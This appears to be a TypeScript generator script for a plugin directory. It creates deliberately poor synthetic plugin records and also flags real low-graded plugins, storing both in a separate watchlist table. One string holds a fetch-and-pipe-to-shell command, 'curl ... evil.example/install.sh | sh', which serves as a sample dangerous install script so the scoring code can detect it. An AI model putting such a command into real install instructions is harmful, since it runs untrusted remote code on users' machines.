// ============================================================
// gen-lowquality.mts — Low-Quality Watchlist generator (Job 2)
// 用途: 生成「低质量插件区」的合成警示示例 + 从真实主库挑低分插件
// 绝不写入 Plugin 主表 —— 只写独立表 low_quality_plugins
// 页面明示: "合成示例·非真实仓库·仅供警示，真实环境请勿安装"
// 用法: npm run gen:lowquality   (CI: .github/workflows/daily-evaluate.yml Job 2)
// ============================================================

import { PrismaClient } from "@prisma/client";
import { scorePlugin, type GithubRepoInput, type NpmInput } from "../src/lib/scoring";

const prisma = new PrismaClient();

// ===== Config =====
const TARGET = Number(process.env.TARGET_LOWQ ?? "60"); // synthetic examples per run
const INCLUDE_REAL_D = (process.env.INCLUDE_REAL_D ?? "1") === "1"; // also flag real D-grade plugins

const SYNTH_OWNERS = [
  "dsh-synth",
  "harness-community",
  "plugin-forge",
  "deeptool",
  "agentforge-labs",
  "pocket-bundle",
  "dshtools",
  "harbor-mods",
];

const SYNTH_PREFIXES = [
  "json", "csv", "xml", "yaml", "toml", "markdown", "shell", "http", "grpc",
  "mqtt", "amqp", "kafka", "redis", "postgres", "mysql", "mongo", "vector",
  "agent", "tool", "widget", "panel", "theme", "skin", "icon", "emoji",
];

const SYNTH_SUFFIXES = [
  "viewer", "converter", "linter", "runner", "monitor", "builder", "parser",
  "formatter", "inspector", "debugger", "profiler", "optimizer", "analyzer",
  "packer", "loader", "fetcher", "publisher", "scheduler", "watcher",
];

// Deterministic PRNG (same as daily-evaluate) — stable names across re-runs
function mulberry32(seed: number) {
  let a = seed >>> 0;
  return function () {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

// Low-quality archetypes: each one intentionally fails 2+ dimensions.
// ~40% carry a dangerous install script (hard D-grade via assignGrade).
function buildSyntheticExample(index: number, seed: number): {
  name: string; owner: string; repoName: string;
  score: number; grade: string; stars: number; desc: string;
} {
  const rng = mulberry32(seed + index * 7919);
  const owner = SYNTH_OWNERS[Math.floor(rng() * SYNTH_OWNERS.length)];
  const prefix = SYNTH_PREFIXES[Math.floor(rng() * SYNTH_PREFIXES.length)];
  const suffix = SYNTH_SUFFIXES[Math.floor(rng() * SYNTH_SUFFIXES.length)];
  const repoName = `${prefix}-${suffix}-${index}`;

  const dangerInstall = rng() < 0.4; // high danger rate on purpose (warning zone)
  const installScriptText = dangerInstall
    ? "curl -fsSL https://evil.example/install.sh | sh"
    : "npm install && npm run build";

  // Deliberately poor repo: stale, no docs, no license, no CI, low stars
  const repo: GithubRepoInput = {
    name: `${owner}/${repoName}`,
    owner,
    repoName,
    githubUrl: `https://github.com/${owner}/${repoName}`,
    description: "DSH community plugin (synthetic example — NOT a real repository)",
    stars: Math.round(rng() * 25),
    pushedAt: new Date(Date.now() - (180 + Math.round(rng() * 500)) * 86_400_000).toISOString(),
    archived: rng() < 0.3,
    readmeLength: Math.round(rng() * 150),
    hasLicense: rng() < 0.2,
    hasCi: rng() < 0.1,
    openIssues: Math.round(rng() * 70),
    hasDshBundle: rng() < 0.25,
    installScriptText,
  };

  const npm: NpmInput | null = rng() < 0.3
    ? {
        name: repoName,
        version: `0.${Math.floor(rng() * 9)}.${Math.floor(rng() * 9)}`,
        lastPublishAt: new Date(Date.now() - (180 + Math.round(rng() * 400)) * 86_400_000).toISOString(),
        weeklyDownloads: Math.round(rng() * 150),
        hasInstallScripts: dangerInstall || rng() < 0.3,
        exists: true,
      }
    : null;

  const result = scorePlugin({ repo, npm });

  return {
    name: `${owner}/${repoName}`,
    owner,
    repoName,
    score: result.score,
    grade: result.grade,
    stars: repo.stars,
    desc: "合成示例·非真实仓库·仅供教学警示 (synthetic example, NOT a real repo)",
  };
}

async function main() {
  const today = new Date().toISOString().slice(0, 10);
  const seed = Number(today.replace(/-/g, ""));

  // 1. Generate synthetic examples (deterministic per-day)
  const existing = new Set(
    (await prisma.lowQualityPlugin.findMany({ select: { name: true } })).map((p) => p.name)
  );
  const synthetic: { name: string; owner: string; repoName: string; score: number; grade: string; stars: number; desc: string }[] = [];
  let idx = 0;
  while (synthetic.length < TARGET) {
    const ex = buildSyntheticExample(idx, seed);
    idx += 1;
    if (existing.has(ex.name)) continue;
    synthetic.push(ex);
  }

  // 2. Optionally also flag real low-grade (D) plugins from the main table
  const realLow: { name: string; owner: string; repoName: string; score: number; grade: string; stars: number; githubUrl: string | null; description: string | null }[] = [];
  if (INCLUDE_REAL_D) {
    const dGrade = await prisma.plugin.findMany({
      where: { grade: "D", evalSource: { not: "synthetic" } },
      select: { name: true, owner: true, repoName: true, score: true, grade: true, stars: true, githubUrl: true, description: true },
      orderBy: { score: "asc" },
      take: 40,
    });
    for (const p of dGrade) {
      if (existing.has(p.name)) continue;
      realLow.push(p);
    }
  }

  // 3. Upsert everything
  let added = 0;
  for (const s of synthetic) {
    await prisma.lowQualityPlugin.upsert({
      where: { name: s.name },
      update: { score: s.score, grade: s.grade, stars: s.stars },
      create: {
        name: s.name, owner: s.owner, repoName: s.repoName,
        synthetic: true, score: s.score, grade: s.grade,
        stars: s.stars, description: s.desc,
      },
    });
    added += 1;
  }
  for (const r of realLow) {
    await prisma.lowQualityPlugin.upsert({
      where: { name: r.name },
      update: { score: r.score, grade: r.grade, stars: r.stars, synthetic: false },
      create: {
        name: r.name, owner: r.owner, repoName: r.repoName,
        githubUrl: r.githubUrl, synthetic: false,
        score: r.score, grade: r.grade, stars: r.stars, description: r.description ?? null,
      },
    });
    added += 1;
  }

  const total = await prisma.lowQualityPlugin.count();
  console.log(`Low-quality watchlist: ${total} total (${synthetic.length} synthetic + ${realLow.length} real-D) added/refreshed this run`);
  if (process.env.REPORT_PATH) {
    const { writeFileSync } = await import("node:fs");
    writeFileSync(process.env.REPORT_PATH, JSON.stringify({ today, synthetic: synthetic.length, realLow: realLow.length, total }, null, 2));
  }
}

main()
  .catch((err) => { console.error(err); process.exit(1); })
  .finally(async () => { await prisma.$disconnect(); });
